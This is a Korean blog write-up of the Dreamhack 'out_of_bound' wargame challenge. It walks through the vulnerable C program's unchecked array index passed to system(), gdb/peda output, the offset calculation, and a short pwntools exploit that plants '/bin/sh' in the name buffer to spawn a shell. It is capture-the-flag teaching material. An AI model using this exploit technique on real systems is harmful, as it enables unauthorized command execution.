---
title: "[Dreamhack] out_of_bound Write up"
author: d0razi
date: 2023-08-15 16:30
categories: [InfoSec, Pwn]
tags: [linux, Dreamhack]
image: /assets/img/media/banner/dreamhack.jpg
---

# C 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler() {

    puts("TIME OUT");
    exit(-1);
}

void initialize() {

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main() {
    
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

전역 변수로 char형 변수 name[16]이랑 포인터인 command를 선언합니다.

메인 함수를 보면 첫번째로 name에 Admin name을 입력받습니다.

그리고 숫자를 입력받고 포인터 배열에 있는 커맨드를 불러와서 system 명령어로 실행시킵니다.

scanf에서 idx를 입력받고 sysyem함수에서 command를 불러올때 idx값이 배열의 크기를 넘는지 검사하는 부분이 없기때문에 out of bound 취약점이 발생하는것을 알 수 있습니다.

name에 “/bin/sh”을 입력하고 idx에 스택에 변수 name이 몇 번째에 있는지 입력해주면 해결될 것 같습니다.

---

# 파일 분석

우리가 디버깅을 하면서 알아내야 하는 정보는 아래와 같습니다.

- Admin name의 위치와 command 배열의 오프셋
- name에서 입력할때 저장되는 주소

디버깅은 peda를 사용했습니다.

### Admin name의 위치와 command 배열의 오프셋구하기

---

Admin name을 입력받는곳에서 aaaa를 입력한 상태입니다 .

```nasm
[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0xf7f9e000 --> 0x229dac 
ECX: 0x804a0ac ("aaaa\n")
EDX: 0x10 
ESI: 0xffffcfb4 --> 0xffffd191 ("/home/zergsung/pwn/dreamhack/out_of_baound/out_of_bound")
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0xffffcee8 --> 0xf7ffd020 --> 0xf7ffda40 --> 0x0 
ESP: 0xffffcec0 --> 0x0 
EIP: 0x804870d (<main+66>:	add    esp,0x10)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048701 <main+54>:	push   0x804a0ac
   0x8048706 <main+59>:	push   0x0
   0x8048708 <main+61>:	call   0x80484a0 <read@plt>
=> 0x804870d <main+66>:	add    esp,0x10
   0x8048710 <main+69>:	sub    esp,0xc
   0x8048713 <main+72>:	push   0x804881e
   0x8048718 <main+77>:	call   0x80484b0 <printf@plt>
   0x804871d <main+82>:	add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xffffcec0 --> 0x0 
0004| 0xffffcec4 --> 0x804a0ac ("aaaa\n")
0008| 0xffffcec8 --> 0x10 
0012| 0xffffcecc --> 0x80486ec (<main+33>:	sub    esp,0xc)
0016| 0xffffced0 --> 0xffffcf10 --> 0xf7f9e000 --> 0x229dac 
0020| 0xffffced4 --> 0xf7fbe66c --> 0xf7ffdba0 --> 0xf7fbe780 --> 0xf7ffda40 --> 0x0 
0024| 0xffffced8 --> 0xf7fbeb20 --> 0xf7d8ecc6 ("GLIBC_PRIVATE")
0028| 0xffffcedc --> 0xe4b24e00 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804870d in main ()
```

ECX를 보면 0x804a0ac에 aaaa가 저장되는것을 알 수 있습니다. 

```nasm
main 함수
0x080486cb <+0>:	lea    ecx,[esp+0x4]
0x080486cf <+4>:	and    esp,0xfffffff0
0x080486d2 <+7>:	push   DWORD PTR [ecx-0x4]
0x080486d5 <+10>:	push   ebp
0x080486d6 <+11>:	mov    ebp,esp
0x080486d8 <+13>:	push   ecx
0x080486d9 <+14>:	sub    esp,0x14
0x080486dc <+17>:	mov    eax,gs:0x14
0x080486e2 <+23>:	mov    DWORD PTR [ebp-0xc],eax
0x080486e5 <+26>:	xor    eax,eax
0x080486e7 <+28>:	call   0x804867b <initialize>
0x080486ec <+33>:	sub    esp,0xc
0x080486ef <+36>:	push   0x8048811
0x080486f4 <+41>:	call   0x80484b0 <printf@plt>
0x080486f9 <+46>:	add    esp,0x10
0x080486fc <+49>:	sub    esp,0x4
0x080486ff <+52>:	push   0x10
0x08048701 <+54>:	push   0x804a0ac
0x08048706 <+59>:	push   0x0
0x08048708 <+61>:	call   0x80484a0 <read@plt>
0x0804870d <+66>:	add    esp,0x10
0x08048710 <+69>:	sub    esp,0xc
0x08048713 <+72>:	push   0x804881e
0x08048718 <+77>:	call   0x80484b0 <printf@plt>
0x0804871d <+82>:	add    esp,0x10
0x08048720 <+85>:	sub    esp,0x8
0x08048723 <+88>:	lea    eax,[ebp-0x10]
0x08048726 <+91>:	push   eax
0x08048727 <+92>:	push   0x8048832
0x0804872c <+97>:	call   0x8048540 <__isoc99_scanf@plt>
0x08048731 <+102>:	add    esp,0x10
0x08048734 <+105>:	mov    eax,DWORD PTR [ebp-0x10]
0x08048737 <+108>:	mov    eax,DWORD PTR [eax*4+0x804a060]
0x0804873e <+115>:	sub    esp,0xc
0x08048741 <+118>:	push   eax
0x08048742 <+119>:	call   0x8048500 <system@plt>
0x08048747 <+124>:	add    esp,0x10
0x0804874a <+127>:	mov    eax,0x0
0x0804874f <+132>:	mov    edx,DWORD PTR [ebp-0xc]
0x08048752 <+135>:	xor    edx,DWORD PTR gs:0x14
0x08048759 <+142>:	je     0x8048760 <main+149>
0x0804875b <+144>:	call   0x80484e0 <__stack_chk_fail@plt>
0x08048760 <+149>:	mov    ecx,DWORD PTR [ebp-0x4]
0x08048763 <+152>:	leave  
0x08048764 <+153>:	lea    esp,[ecx-0x4]
0x08048767 <+156>:	ret    
End of assembler dump.
```

위에 main함수의 108번째줄을 보면 0x804a060에서 가져오는것을 볼 수 있습니다.

그럼 (0x804a0ac - 0x804a060)/4 를 해주면 오프셋을 구할 수 있다. 4를 나눠주는이유는 포인터 배열이 하나당 4바이트를 할당하기 때문입니다. 

계산해보면 19가 나옵니다.

### name에 쉘코드 삽입하기

---

c언어 코드를 보면 command 배열이 포인터로 선언되는것을 알 수 있습니다. 그렇기 때문에 Admin name에 바로 쉘코드를 삽입하면 그 쉘코드가 16진수로 바뀐주소에 있는값을 가져오기 때문에 오류가 납니다. 그렇기 때문에 우리는 먼저 쉘코드가 있을 주소 4바이트를 입력한후 그 주소에 쉘코드를 써주면 됩니다.

그렇기에 쉘코드는 name의 주소에 name의 주소값을 더한 4바이트 큰 name + 4 에 위치하게 됩니다. 

그럼 우린입력할때 name주소+4다음 쉘코드를 입력하면 될 것 입니다.

이제 모든 정보를 얻었으니 익스플로잇 코드를 짜보겠습니다.

---

# Exploit

```python
from pwn import *

#p = remote("host3.dreamhack.games", 9469)
p = process("./oob")

shell = b"/bin/sh"
name = 0x804a0ac

p.recvuntil(b'name:')

payload = p32(name+4) + shell

p.sendline(payload)
p.recvuntil(b'want?:')
p.sendline(b'19')
p.interactive()
```

![Untitled](/assets/img/media/post_img/dreamhack/oob/Untitled.png)